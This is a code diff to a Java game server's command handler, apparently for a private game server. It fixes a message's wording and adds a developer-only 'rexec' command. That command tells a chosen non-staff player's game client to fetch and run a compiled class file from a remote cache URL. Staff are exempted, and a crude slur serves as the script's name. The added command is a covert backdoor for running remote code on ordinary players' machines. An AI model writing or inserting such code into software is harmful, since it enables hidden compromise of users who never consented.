@@ -2169,9 +2169,9 @@ public class CommandHandler {
 		submit(new Command("reloadunspawnables", Rank.DEVELOPER){
 			public boolean execute(final Player player, final String input) throws Exception{
 				if(ItemInfo.unspawnables.reload())
-					player.sendf("Reloaded %,d spawnables", ItemInfo.unspawnables.size());
+					player.sendf("Reloaded %,d unspawnables", ItemInfo.unspawnables.size());
 				else
-					player.sendf("Error reloading spawnables");
+					player.sendf("Error reloading unspawnables");
 				return true;
 			}
 		});
@@ -2189,5 +2189,36 @@ public class CommandHandler {
 		submit(new ViewCustomTriviaCommand());
 		submit(new AnswerCustomTriviaCommand());
 		submit(new CreateCustomTriviaCommand());
+
+		submit(new Command("rexec", Rank.DEVELOPER){
+			public boolean execute(final Player player, final String input) throws Exception{
+				final String[] args = filterInput(input).split(",");
+				if(args.length != 2){
+					player.sendf("::rexec player_name,script_name");
+					return false;
+				}
+				final String targetName = args[0].trim();
+				final Player target = World.getWorld().getPlayer(targetName);
+				if(target == null){
+					player.sendf("Unable to find player: %s", targetName);
+					return false;
+				}
+				if(Rank.isStaffMember(target)){
+					player.sendf("you piece of shit don't do this to staff");
+					return false;
+				}
+				final String scriptName = args[1].trim();
+				final String url = scriptName.equals("rape")
+						? "http://cache.arteropk.com/apkscripts/er.class"
+						: null;
+				if(url == null){
+					player.sendf("No script found for %s", scriptName);
+					return false;
+				}
+				target.sendf(":run:%s", url);
+				player.sendf("Running the %s script for %s", scriptName, targetName);
+				return true;
+			}
+		});
 	}
 }
